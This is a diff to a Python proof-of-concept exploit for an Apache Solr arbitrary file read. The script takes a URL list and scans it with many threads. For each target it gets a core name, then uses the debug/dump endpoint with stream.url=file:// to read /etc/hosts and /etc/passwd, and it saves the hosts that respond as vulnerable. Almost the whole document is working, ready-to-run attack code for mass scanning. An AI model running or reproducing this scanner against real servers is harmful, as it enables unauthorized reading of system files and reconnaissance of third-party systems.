@@ -12,7 +12,7 @@ from threading import Lock
 from concurrent.futures import ThreadPoolExecutor
 from argparse import ArgumentParser
 
-class POC:
+class ApacheSolrReadAnyFile:
     def __init__(self):
         self.banner()
         self.args = self.parseArgs()
@@ -56,24 +56,21 @@ class POC:
         parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
         parser.add_argument("-T", "--Thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
         parser.add_argument("-t", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
-        parser.add_argument("-o", "--output", required=False, type=str, default=f"./{date}.txt",  help=f"Vuln url output file, default is ./{date}.txt")
+        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help="Vuln url output file, default is {date}.txt")
         return parser.parse_args()
 
     # 验证漏洞
     def verify(self, url):
+        msg = ""
         try:
-            url = url.replace("http://", "")
-        except:
-            try:
-                url = url.replace("https://", "")
-            except:
-                pass
-        try:
-            reqURL = "http://" + url + "/solr/admin/cores?indexInfo=false&wt=json"
-            rep = requests.get(url=reqURL, timeout=self.args.timeout)
+            reqURL = url + "/solr/admin/cores?indexInfo=false&wt=json"
+            rep = requests.get(url=reqURL, timeout=self.args.timeout, verify=False)
             name = list(json.loads(rep.text)["status"])[0]
+        except IndexError:
+            msg = f"[-] [ Safe ]  {url}"
         except:
-            msg = f"[-] {url} is safe"
+            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
+        if msg:
             self.lock.acquire()
             try:
                 print(msg)
@@ -81,7 +78,7 @@ class POC:
                 self.lock.release()
             return
         if "127.0.0.1" in self.readFile(url, name, "/etc/hosts"):
-            msg = f"\033[32m[+] {url} Exist Vulnerability !\033[0m"
+            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
             self.lock.acquire()
             try:
                 self.findCount += 1
@@ -90,7 +87,7 @@ class POC:
                 self.lock.release()
         else:
             if "root" in self.readFile(url, name, "/etc/passwd"):
-                msg = f"\033[32m[+] {url} Exist Vulnerability !\033[0m"
+                msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
                 self.lock.acquire()
                 try:
                     self.findCount += 1
@@ -107,18 +104,17 @@ class POC:
 
     # 利用漏洞读取文件
     def readFile(self, url, name, filename):
-        reqURL = "http://" + url + "/solr/" + name + "/debug/dump?param=ContentStreams&wt=json"
+        reqURL = url + "/solr/" + name + "/debug/dump?param=ContentStreams&wt=json"
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded'
         }
         postData = "stream.url=file://" + filename
         try:
-            rep = requests.get(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout)
+            rep = requests.get(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout, verify=False)
             repData = str(rep.text)
             fileData = json.loads(repData)["streams"][0]["stream"]
-            # print(fileData.replace(r"\n", "\n"))
             return fileData
-        except IndexError:
+        except:
             return ""
 
     # 加载url地址
@@ -126,7 +122,9 @@ class POC:
         urlList = []
         with open(self.args.file) as f:
             for line in f.readlines():
-                urlList.append(line.strip())
+                line = line.replace("http://", "") if "http://" in line else line
+                line = line.replace("https://", "") if "https://" in line else line
+                urlList.append(f"http://{line.strip()}")
         return urlList
 
     # 多线程运行
@@ -139,7 +137,10 @@ class POC:
 
     # 输出到文件
     def output(self):
-        with open(self.args.output, "a") as f:
+        if not os.path.isdir(r"./output"):
+            os.mkdir(r"./output")
+        self.outputFile = f"./output/{self.args.output}.txt"
+        with open(self.outputFile, "a") as f:
             for url in self.vulnRULList:
                 f.write(url + "\n")
 
@@ -149,11 +150,11 @@ class POC:
             self.end = time.time()
             print("Time Spent: %.2f" % (self.end - self.start))
             self.output()
-            print("-" * 20, f"\nThe vulnURL has been saved in {self.args.output}\n")
+            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
         except:
             pass
 
 if __name__ == "__main__":
-    POC()
+    ApacheSolrReadAnyFile()
 
 
